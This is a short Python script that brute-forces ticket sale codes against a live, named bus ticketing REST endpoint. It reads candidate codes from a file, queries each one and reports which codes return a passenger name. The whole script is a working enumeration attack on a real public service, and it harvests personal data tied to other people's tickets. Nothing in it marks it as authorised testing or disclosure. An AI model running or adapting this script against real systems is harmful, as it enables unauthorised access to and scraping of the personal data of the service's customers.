import requests

url = "https://alavabus.araba.eus/SalesPortalRestService-1/searchTicketConsult"

with open("hex.txt", "r") as archivo:
    for ticket in archivo:
        ticket = ticket.replace("\n", "")
        response = requests.get(url, params={"saleCode": ticket, "lang":1})
        data = response.json()
        if data.get("name") is not None:
            print("OK " + ticket, response.status_code)
        else:
            print("Fail " + ticket, response.status_code)
